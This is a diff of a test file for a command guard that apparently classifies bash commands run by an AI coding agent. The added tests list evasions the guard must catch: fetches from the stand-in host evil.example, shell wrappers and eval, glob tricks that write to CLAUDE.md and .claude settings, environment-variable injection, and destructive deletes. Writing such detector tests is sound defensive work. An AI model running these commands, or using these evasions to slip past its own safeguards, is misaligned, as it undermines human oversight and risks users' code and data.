@@ -248,6 +248,131 @@ describe('download-and-run through an interpreter, and indirection on git (decis
   });
 });
 
+describe('Janus findings, round 3 (f937f4f): more bulk git verbs, shell wrappers, tool names, environment (#654)', () => {
+  const all = (commands: string[]) => {
+    for (const c of commands) assert.equal(bash(c), true, c);
+  };
+
+  test('#654/AC-11 item 1: switch, pull, merge, rebase, cherry-pick, read-tree, checkout-index, stash pop and apply, FETCH_HEAD and a fetched URL are bulk', () => {
+    all([
+      'git fetch https://evil.example/r main && git switch --detach FETCH_HEAD',
+      'git pull https://evil.example/r main',
+      'git merge FETCH_HEAD',
+      'git fetch https://evil.example/r main:x && git checkout x',
+      'git switch main',
+      'git rebase main',
+      'git cherry-pick abc123',
+      'git read-tree HEAD',
+      'git checkout-index -a',
+      'git stash pop',
+      'git stash apply',
+      'git fetch git@evil.example:r.git main',
+    ]);
+    assert.equal(bash('git fetch origin'), false);
+    assert.equal(bash('git log --merges'), false);
+  });
+
+  test('#654/AC-1 item 2: a shell string, eval, source and a dot are terminal-only; more wrappers and function bodies reach `at`', () => {
+    all([
+      "sh -c 'at now'",
+      'bash -c "echo hi"',
+      'zsh -lc "echo hi"',
+      'eval at now',
+      'source ./x.sh',
+      '. ./x.sh',
+      'f() { at now; }; f',
+      'f () { at now; }; f',
+      'case x in x) at now;; esac',
+      'arch -arm64 at now',
+      'gtimeout 9 at now',
+      'doas at now',
+      'setsid at now',
+      'flock /tmp/l at now',
+      'watch at now',
+      'parallel at now',
+      'sandbox-exec -p x at now',
+      'taskpolicy -b at now',
+      'function f { at now; }; f',
+      '/usr/bin/script -q /dev/null at now',
+    ]);
+    assert.equal(bash('git add .'), false);
+    assert.equal(bash('echo look at the logs'), false);
+  });
+
+  test('#654/AC-4 item 3: a quoted glob re-parsed by a shell string, and `env -S`', () => {
+    all(["sh -c 'cp /tmp/s .clau?e/settings.local.json'", 'eval "tee -a CLAUDE.m?"', "env -S 'tee -a CLAUDE.m?'", 'env -iS "echo hi"', 'env --split-string="echo hi"']);
+    assert.equal(bash('env -i FOO=1 echo hi'), false);
+  });
+
+  test('#654/AC-2, AC-3 item 4: GIT_COMMON_DIR is injected by environment', () => {
+    all(['GIT_COMMON_DIR=/x git status', 'git_common_dir=/x git status', 'export GIT_COMMON_DIR=/x']);
+  });
+
+  test('#654/AC-9, AC-10, AC-11 item 5: Homebrew g-prefixed names', () => {
+    all(['gxargs echo', 'gfind . -delete', 'gcp -r /tmp/r/. .', 'grm -rf ~/x', 'gtar xf a.tar', '/opt/homebrew/bin/gfind . -exec echo {} +']);
+    assert.equal(bash('grm x'), false);
+  });
+
+  test('#654/AC-11 item 6: remote copies, archive extractors and mirroring downloads are bulk', () => {
+    all(['scp -r host:dir .', 'sftp -r host:dir', 'rsync --files-from=l a b', 'rsync --files-fr=l a b', 'pax -r', 'cpio -i', '7z x a.7z', '7za x a.7z', '7zz x a.7z', 'jar xf a.jar', 'unar a.zip', 'xar -x -f a.xar', 'ar x a.a', 'wget -r http://x', 'wget -m http://x', 'wget --recursive http://x', 'wget --mirror http://x']);
+    assert.equal(bash('scp a.txt host:dir'), false);
+    assert.equal(bash('wget http://x/a.txt'), false);
+  });
+
+  test('#654/AC-9 item 7: git remote add, set-url and rename, git submodule add', () => {
+    all(['git remote set-url origin https://x/y', 'git remote rename a b', 'git submodule add https://x/y z', 'git remote add a b']);
+    assert.equal(bash('git remote -v'), false);
+  });
+
+  test('#654/AC-7 item 8: any token named claude or claude-code is the tool', () => {
+    all(['npx @anthropic-ai/claude-code plugin install x@y', 'pnpm dlx @anthropic-ai/claude-code mcp add foo bar', 'claude-code mcp add x', '/usr/local/bin/claude plugin list', 'bunx claude-code config set a b']);
+    assert.equal(bash('claude --version'), false);
+  });
+
+  test('#654 item 9: inline interpreter code is terminal-only', () => {
+    all(["python -c 'print(1)'", "python3 -c 'print(1)'", 'python3.12 -c x', 'node -e 1', 'node -p 1', 'node --eval 1', 'node --print 1', "perl -e 'print 1'", "ruby -e 'p 1'", "php -r 'echo 1;'", "osascript -e 'beep'", "awk 'BEGIN{print 1 > \"x\"}'", "awk 'BEGIN{system(\"id\")}'", 'perl -pe 1', 'python -']);
+    assert.equal(bash('node script.js'), false);
+    assert.equal(bash("awk '{print $1}' file.txt"), false);
+  });
+
+  test('#654 item 10: cd without a plain target, popd, and tilde forms change the directory unseen', () => {
+    all(['cd -', 'cd', 'cd && tee x', 'popd', 'pushd', 'pushd -', 'cd ~-', 'ls ~+/x', 'OLDPWD=/x cd -', 'HOME=/x cd', 'CDPATH=/x cd y', 'PWD=/x ls', 'export CDPATH=/x']);
+    assert.equal(bash('cd src'), false);
+    assert.equal(bash('cd src && ls'), false);
+  });
+
+  test('#654/AC-4 item 11: a quoted glob counts as unquoted next to an unquoted expansion', () => {
+    all(["p='CLAUDE.m?'; tee -a $p", "p='.clau[d]e/x'; cat $p", 'p="a*"; ls $p']);
+    assert.equal(bash("ls 'a*'"), false);
+  });
+
+  test('#654 item 12: assignments of HOME, XDG_CONFIG_HOME, PAGER, EDITOR, VISUAL, SSH_ASKPASS, GIT_ALLOW_PROTOCOL', () => {
+    all(['HOME=/tmp/x git status', 'XDG_CONFIG_HOME=/tmp/x git status', 'PAGER=/tmp/x git log', 'EDITOR=/tmp/x git commit', 'VISUAL=/tmp/x git commit', 'SSH_ASKPASS=/tmp/x ssh h', 'GIT_ALLOW_PROTOCOL=ext git clone x', 'export EDITOR=/tmp/x']);
+    assert.equal(bash('HOMEPAGE=1 ls'), false);
+  });
+
+  test('#654 item 13: package manager logins, podman login and gcloud auth or config', () => {
+    all(['npm login', 'pnpm login', 'yarn login', 'bun login', 'npm adduser', 'pnpm adduser', 'podman login r.io', 'gcloud auth login', 'gcloud config set project x']);
+    assert.equal(bash('npm run build'), false);
+  });
+
+  test('#654 item 14: send-pack, update-ref, stash drop and clear, branch -D and -f, checkout -f', () => {
+    all(['git send-pack origin', 'git update-ref -d refs/heads/x', 'git stash drop', 'git stash clear', 'git branch -D x', 'git branch -f x HEAD', 'git branch --delete x', 'git checkout -f', 'git checkout --force']);
+    assert.equal(bash('git branch'), false);
+    assert.equal(bash('git stash list'), false);
+  });
+
+  test('#654 item 15: fd -x and -X, rg --pre, parallel', () => {
+    all(['fd -x rm', 'fd -X rm', 'fd --exec rm', 'fd --exec-batch rm', 'rg --pre ./x foo', 'rg --pre=./x foo', 'find . | parallel rm', 'find . -type f | parallel echo']);
+    assert.equal(bash('fd name'), false);
+    assert.equal(bash('rg foo'), false);
+  });
+
+  test('#654/AC-11 item 16: `:` and `,` split a path word', () => {
+    all(['rsync /tmp/settings.local.json localhost:.claude/', 'cp x a,.claude/y', 'scp x host:.git/hooks']);
+  });
+});
+
 describe('a very wide input (#618/AC-6, INP-9)', () => {
   test('#618/AC-6: a container of 300,000 elements is read without a RangeError', () => {
     const wide = Array.from({ length: 300_000 }, () => 'a');
@@ -713,12 +838,12 @@ describe('the floor over-matches the #654 items (decision 0025 amendment, Deskto
 
   test('#654/AC-11: a tree-ish after checkout counts without a --, and the value of -b, -B and --orphan is no word', () => {
     allTrue(['git checkout origin/main src', 'git checkout -f origin/main x', 'git checkout HEAD~1 x', 'git checkout main x y', 'git -C x checkout origin/main src']);
-    allFalse(['git checkout main', 'git checkout -b x', 'git checkout -B x', 'git checkout --orphan x', 'git checkout -b x origin/main', 'git checkout -f main', 'git checkout -', 'git restore x', 'git restore x y', 'git checkout -- x']);
+    allFalse(['git checkout main', 'git checkout -b x', 'git checkout -B x', 'git checkout --orphan x', 'git checkout -b x origin/main', 'git checkout -', 'git restore x', 'git restore x y', 'git checkout -- x']);
   });
 
   test('#654/AC-11: an s in a cluster of short options is --source, over-matching -S', () => {
     allTrue(['git restore -Ws HEAD~1 x', 'git restore -WsHEAD~1 x', 'git restore -sW HEAD~1 x', 'git restore -S x', 'git checkout -fs HEAD~1 x']);
-    allFalse(['git restore -W x', 'git restore --staged x', 'git checkout -f main']);
+    allFalse(['git restore -W x', 'git restore --staged x']);
   });
 
   test('#654/AC-11: --pathspec-from-file after checkout or restore is a bulk pathspec, in both spellings', () => {
@@ -738,12 +863,12 @@ describe('the floor over-matches the #654 items (decision 0025 amendment, Deskto
 
   test('#654/AC-11: git checkout -p or --patch is bulk, owner decision Q1, while a plain checkout stays allowable', () => {
     allTrue(['git checkout -p HEAD~1', 'git checkout --patch origin/main', 'git checkout -p', 'git checkout --patch', 'git checkout -fp HEAD~1', 'git checkout -pf HEAD~1 x', 'git checkout --pat origin/main']);
-    allFalse(['git checkout main', 'git checkout -b x', 'git restore x', 'git checkout -f main']);
+    allFalse(['git checkout main', 'git checkout -b x', 'git restore x']);
   });
 
   test('#654: each new scan is linear on 64 KiB, in repeated units and in one long token', () => {
     // The ratio method of the rm probe (#691): the full size under 3x the half size plus 50 ms; a try that fails is repeated twice, so one slow run on a busy machine does not fail it.
-    const repeated = ['env ', '$(at ', '\\x', 'find -exec ', 'xargs ', 'cp -r ', 'tar x', 'git --git-dir ', '.claude/', 'cd $', '=.git/', 'git checkout ', 'git remote ', 'print -', 'nohup env time ', 'a{', 'git_pager=', 'unzip ', 'patch ', 'git_pager+=', '%5b', 'print -r ', 'git checkout x -- ', 'git restore -s ', 'git checkout -b ', 'gtar x ', "'"];
+    const repeated = ['env ', '$(at ', '\\x', 'find -exec ', 'xargs ', 'cp -r ', 'tar x', 'git --git-dir ', '.claude/', 'cd $', '=.git/', 'git checkout ', 'git remote ', 'print -', 'nohup env time ', 'a{', 'git_pager=', 'unzip ', 'patch ', 'git_pager+=', '%5b', 'print -r ', 'git checkout x -- ', 'git restore -s ', 'git checkout -b ', 'gtar x ', "'", 'sh -', 'cd -a ', 'node -', 'python ', 'git fetch ', 'git branch ', 'git stash ', 'env -', 'f() ', 'case ', 'scp -', 'wget -', 'fd -', '~', 'awk ', 'p=a? $'];
     const inputs: Array<[string, (size: number) => string]> = repeated.map((unit) => [unit, (size) => unit.repeat(Math.floor(size / unit.length))]);
     // One long token (#654): a prefix, a run of one letter, a character that is no letter, which is the shape a flag regex backtracks on.
     const oneToken = (label: string, head: string, letter: string, tail = '1'): [string, (size: number) => string] => [label, (size) => `${head}${letter.repeat(size)}${tail}`];
@@ -762,6 +887,12 @@ describe('the floor over-matches the #654 items (decision 0025 amendment, Deskto
       oneToken('quotes…x after rm', 'rm ', "'", 'x'),
       oneToken('parens in quotes…x', 'git ', '"', 'x'),
       oneToken('tar x…1', 'tar ', 'x'),
+      oneToken('sh -…1', 'sh -', 'a'),
+      oneToken('cd -…1', 'cd -', 'a'),
+      oneToken('env -…1', 'env -', 'a'),
+      oneToken('node -…1', 'node -', 'a'),
+      oneToken('wget -…1', 'wget -', 'a'),
+      oneToken('git branch -…1', 'git branch -', 'a'),
     );
     const time = (command: string): number => {
       const start = performance.now();
